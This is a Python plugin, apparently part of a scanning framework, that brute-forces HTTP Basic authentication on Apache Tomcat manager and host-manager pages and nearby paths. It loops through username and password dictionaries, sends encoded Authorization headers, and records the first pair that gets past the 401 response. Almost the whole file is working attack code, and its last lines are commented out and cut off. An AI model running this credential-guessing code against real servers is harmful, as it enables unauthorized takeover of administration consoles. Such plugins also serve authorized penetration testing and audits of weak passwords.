#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import os
from lib.core.data import paths
from base64 import b64encode
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script, VUL_TYPE, VUL_LEVEL

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'http basic auth burst'
        self.keyword = ['tomcat', 'burst', 'tomcat']
        self.info = 'http basic auth burst'
        self.type = VUL_TYPE.WEAKPASS
        self.level = VUL_LEVEL.HIGH
        self.repair = ''
        self.refer = ''
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'tomcat_usernames.txt'))
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'tomcat_passwords.txt'))
            async with ClientSession() as session:
                for url in [
                    self.base_url + 'manager/html',
                    self.base_url + 'host-manager/html',
                    self.url_normpath(self.base_url, '/'),
                    self.url_normpath(self.url, './'),
                    self.url_normpath(self.url, '../'),
                ]:
                    async with session.get(url=url) as res:
                        if res !=None:
                            if res.status == 401 and 'WWW-Authenticate' in res.headers.keys():
                                async for (username, password) in self.generate_dict(usernamedic, passworddic):
                                    key = str(b64encode(bytes(":".join([username, password]), 'utf-8')), 'utf-8')
                                    headers = {"Authorization": 'Basic %s' % key}
                                    async with session.get(url=url, headers=headers) as res1:
                                        if res1 != None:
                                            if res1.status != 401:
                                                self.flag = 1
                                                self.res.append({"info": username + "/" + password,
                                                                 "key": "Authorization: Basic " + key})
                                                return
                                                # text1 = await res1.text()
                                                # if 'Applications' in text1 or 'Dubbo' in text1 or 'Tomcat' in text1:
                                                #     self.flag = 1
                                                #     self.res.append({"info": username + "/" + password,
                                                #                  "key": "Authorization: " + ":".join([username, password])})
                                                #     return
                                                # else:


